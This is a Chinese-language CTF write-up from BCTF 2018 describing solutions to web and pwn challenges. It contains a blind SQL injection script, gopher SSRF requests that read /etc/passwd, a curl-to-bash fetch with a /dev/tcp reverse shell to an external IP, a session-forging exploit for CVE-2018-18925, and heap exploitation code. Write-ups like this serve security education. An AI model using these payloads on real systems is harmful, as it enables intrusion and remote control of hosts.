大家好，我们 r3kapig 的小伙伴在这周玩了 BCTF 2018. 以下是我们的解题 Writeup ，请各位大佬指教。
# BCTF 2018 online Writeup
## Web
### SEAFARING1
login处有个XSS，不过需要验证码，然后扫了一下站，发现robots.txt，里面有一个/admin/handle_message.php，进去提示：
    {"result":"","error":"CSRFToken ''is not correct"}
注意到这里有个''，猜测传入的csrftoken可能直接输出到了页面中，于是尝试传入csrftoken，分别用GET、POST都试了，然后试出当参数名为token，请求为POST的时候会显示出token值，不过对'/'会进行转义，因此使用svg进行xss，为了避免引号的问题，使用了base64编码，打管理员cookie的XSS
payload如下：
    ">
其中base64的内容为：
把payload写在自己的VPS的1.html上，然后在contact.php向管理员发送地址
    function view_unreads() {
        $.ajax({
            type: "POST",
            url: "/admin/handle_message.php",
            data: {"token": csrf_token, "action": "view_unreads", "status": 0},
            dataType: "json",
            success: function (data) {
                if (!data["error"]) {
                    data = data['result'];
                    var html = '';
                    var tbody = document.getElementById("comments");
                    for (var i = 0; i Checked';
                        } else {
                            Status = 'Not Checked';
                        }
                        html += "   " + Time + "    " + Username + "     " + Uid + "     " + Status + "  "
                    }
                    tbody.innerHTML = html;
                }
                else
                    alert('Error: ' + data["error"]);
            }
        });
    }
尝试自己构造请求，不过提示要本地访问才行，因此需要XSS，让本地的admin去获取消息。流程就是先获取csrftoken，然后发送post请求到/admin/handle_message.php。这里我尝试的时候，少发了个status参数，结果发现响应中报了一个sql查询的错误，并且把查询语句显示出来了，因此感觉status可以注入，各种查表发现f111111ag表，最终打到flag，exp和flag截图如下：
    ">
> bctf{XsS_SQL1_7438x_2xfccmk}
### SEAFARING2
进admin后有个提示：
> Hint: I will tell you a secret path for web2:/admin/m0st_Secret.php! :)
不过访问没啥东西，于是使用sql注入读取这个文件，就在默认目录/var/www/html/admin/m0st_Secret.php，有个ssrf，参数是You_cann0t_guu3s_1t_1s2xs，翻了一下/etc/hosts，得到内网地址是172.20.0.3，感觉要内网搞，用dict协议扫了一下，发现172.20.0.2的4444端口开着,搜了一下相关服务，结合访问主页显示的selemium，应该是selenium
grid服务，搜了一下有篇文章（ 
），未授权访问可以读文件。不过需要一个可用的session，题目环境中的都不能用，需要新建一个，查了一下相关Api（
），然后shodan上面搜了个有洞的站测试抓包，就可以用gopher协议构造出创建session、访问指定url、截屏的请求包了。
    # 新建session
    curl -d You_cann0t_guu3s_1t_1s2xs="gopher%3A//127.0.0.1%3A4444/_POST%2520/wd/hub/session%2520HTTP/1.1%250aHost%3A127.0.0.1%3A4444%250aAccept%3A*/*%250aContent-Length%3A49%250aContent-Type%3Aapplication/json;charset=utf-8%250a%250a{%22desiredCapabilities%22:{%22browserName%22:%22firefox%22}}00000000000" http://127.0.0.1:8080
    # 请求指定url
    curl -d You_cann0t_guu3s_1t_1s2xs="gopher://172.20.0.2:4444/_POST%2520/wd/hub/session/1e23de5c-6e5e-428b-9714-fa71b9ff8f06/url%2520HTTP/1.1%250aHost%3A172.20.0.2%3A4444%250aAccept%3A*/*%250aContent-Length%3A119%250aContent-Type%3Aapplication/json;charset=utf-8%250a%250a%7B%22url%22%3A%22file%3A///etc/passwd%253Fwdsid%3D1e23de5c-6e5e-428b-9714-fa71b9ff8f06%26wdurl%3Dhttp%253A%252F%252F172.20.0.2%253A4444%252Fwd%252Fhub%22%7D00000000000" http://seafaring.xctf.org.cn:9999/admin/m0st_Secret.php
由于这个服务器的server有问题，正常发包会卡死，瞎比试后发现后面多添一堆0就不会卡死了。截屏的话只要访问/wd/hub/session/:sessionId/screenshot就可以了，返回的是json格式的串，里面有图片的base64编码。解析出来存入png即可得到截图。  
列目录的截图：  
读flag的截图：  
### babyweb
进去之后功能很少，search的时候有个sort参数，多次尝试，有迷之过滤，但是发现sort=current_database()的时候结果正常，然后sort=abc()的时候404，猜测是Postgresql，于是进一步使用其它函数进行测试，发现sort=pg_ls_dir('/proc')的时候会返回很多结果，sort=pg_ls_dir('/proca')这样就404了，因此可以配合concat和substring进行盲注，例如sort=pg_ls_dir(concat('/proc',substring('a',1,ascii(substring('a',1,1))-97)))这样会返回结果，但是97换成别的就会404，注出密码的payload如下：
    import requests
    dic = list("abcdefghijklmnopqrstuvwxyz0123456789_!;~.")
    ans = ''
    for pos in range(1,50):
        for c in dic:
            c = ord(c)
            data = {'search':'admin','sort':"pg_ls_dir(concat('/proc',substring('a',1,ascii(substring(password,%d,1))-%d))),id" % (pos,c)}
            #print(data)
            resp = requests.post("http://47.95.235.14:9999/search",data=data).text
            if len(resp)>10000:
                ans += chr(c)
                print(ans)
                break
上cmd5解码，得到密码15676543456  
登进去发现有个RESTFULAPI接口，结合控制台提示restful api provided by
fastjson.，猜测是fastjson的漏洞，网上找了exp打了就行了，不过Runtime.getRuntime().exec()有的符号不能用（例如|和>），找了个在线转化payload的网站。具体执行的命令为
    curl zzm.cat:8080/1.txt|bash
其中1.txt为：
    /bin/bash  -i > /dev/tcp/45.78.39.29/7777 0&1
转化后为
    bash -c {echo,Y3VybCB6em0uY2F0OjgwODAvMS50eHR8YmFzaA==}|{base64,-d}|{bash,-i}
然后编译下面的java文件，然后将class文件base64编码  
最后构造json请求并发送即可反弹shell  
在根目录下找到flag：  
### SimpleVN
有个pug模板注入不过只能字母数字和点，但是process对象的东西都能读，然后读源码发现有个process.env.FLAGFILENAME，可以直接用process.env.FLAGFILENAME读取，读到flag位置为5E192BCA-1C3F-4CE8-933C-D8B880D72EAD.txt，从源码可知读取这个文件需要本地才行，于是发请求给bot截屏：  
提示flag在底部，显示不出来，因此需要一个XSS截取5E192BCA-1C3F-4CE8-933C-D8B880D72EAD.txt底部的内容，并且截屏。  
在提交url截屏的时候有个host的过滤，不过可以用data协议进行绕过，使得host为空串，includes为真，并且可以直接插入标签进行XSS，payload如下：
    data:text/html,
最后获取flag截屏：  
### checkin
思路就是CVE-2018-18925的思路，session存在文件中且sessionid没有对`../`做过滤，导致可以在头像上传处上传伪造的session文件，再用sessionid包含即可伪造身份为admin。扫目录可以扫到`/admin_panel`，session伪造成admin之后访问这个页面即可的得到flag。session文件生成的exp（直接改的CVE-2018-18925的exp）:
    package main
    import (
        "bytes"
        "encoding/gob"
        "encoding/hex"
        "fmt"
        "io/ioutil"
    )
    func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
        for _, v := range obj {
            gob.Register(v)
        }
        buf := bytes.NewBuffer(nil)
        err := gob.NewEncoder(buf).Encode(obj)
        return buf.Bytes(), err
    }
    func main() {
        var uid int64 = 1
        obj := map[interface{}]interface{}{"username": "admin", "UID": uid}
        data, err := EncodeGob(obj)
        if err != nil {
            fmt.Println(err)
        }
        err = ioutil.WriteFile("test2.png", data, 0777)
        if err != nil {
            fmt.Println(err)
        }
        edata := hex.EncodeToString(data)
        fmt.Println(edata)
    }
### babySQLiSPA
注册用户名限定了`[a-zA-Z0-9]`，显然没法注入，于是好好看了看网页源码，发现是用webpack打包的。用过的都知道webpack打包后会生成.map文件，于是访问[main.dfa730c5.js.map](http://47.93.100.42:9999/static/js/main.dfa730c5.js.map)，在其中可以发现两个没有用到的api：
`searchHints`中用到的`captcha`就是从`getCaptcha`中得到的，于是：
显然可以注入，且能报错。于是经过漫长的fuzz（验证码爆破六位MD5真的很恶心，测一条payload就要等几分钟，而且测了两小时到快做出来的时候放hint把waf给了，后面的人不用再测了...难受）发现报错函数`GTID_SUBTRACT`可以用，于是就：
这里发现都是些乱码表名，而且很长，想看它们的列名时发现列名也类似，最后查数据时发现注入的hint有长度限制，光是`SELECT(列名)FROM(表名)`就已经超限了，所以猜测flag可能不在这几个表里。本地测试的时候发现`GTID_SUBTRACT`的报错信息有长度限制，于是猜测真正放flag的表可能排在后面没有显示出来，于是引入`REVERSE`函数倒序查看后面的表名：
这里出来的`EEeReHSSsIIiIggaaAAaLlLlFfFEhv`倒过来就是`vhEFfFlLlLaAAaaggIiIIsSSHeReEE`，能看出来应该是flag表了，所以最后：
## Pwn
### three
三次 chunk ，tcache 的利用，通过改stdout leak libc
    add(io, "0\n")
        add(io, "1\n")
        delete(io, 0, "y")
        delete(io, 1, "n")
        #libc_base, proc_base, heap_base = get_pie_addr()
        #print "libc_base:", hex(libc_base&0xffffff)
        #print "heap_base:", hex(heap_base&0xffff)
        heap_base = 0x8000
        libc_base = 0xda7000
        edit(io, 1, p64(heap_base + 0x60)[:2])
        add(io, "0\n")
        add(io, p64(0) + p64(heap_base + 0x10)[:2]) #2
        delete(io, 0, "y\n")
        edit(io, 2, p64(0) + p64(heap_base + 0x10)[:2])
        add(io, p64(0) + p64(0x51))
        delete(io, 0, "y\n")
        delete(io, 1, "y\n")
        edit(io, 2, p64(0) + p64(heap_base + 0x20)[:2])
        add(io, p64(0)*7 + p64(0x201))
        delete(io, 0, "y\n")
        edit(io, 2, p64(0) + p64(heap_base + 0x60)[:2])
        #add(io, p64(0))
        #gdb_attach(io, [])
        malloc_hook = 0x3ebc30
        unsortbin = 0x3ebca0
        stdout_addr = 0x3ec760
        for i in range(8):
            delete(io, 2, "n\n")
        edit(io, 2, p64(0) + p64(stdout_addr + libc_base)[:2])
        payload = ""
        payload += p64(0x00000000fbad1800) + p64(0)*3 + p8(0)
        add(io, payload)
        #delete(io, 0, "n\n")
        #gdb_attach(io, [])
        recv(io, 8)
        data = recv(io, 8)
        print data
        libc_addr = d2v_x64(data)
        print "libc_addr:", hex(libc_addr)
        libc_base = libc_addr - 0x3ed8b0
        print "libc_base:", hex(libc_base)
        free_hook  = libc_base + 0x3ed8e8
        system_addr = libc_base + 0x4f440
        edit(io, 2, p64(0) + p64(free_hook - 8))
        #payload = p64(0)*7 + p64(free_hook - 8)
        #edit(io, 1, payload)
        #gdb_attach(io, [])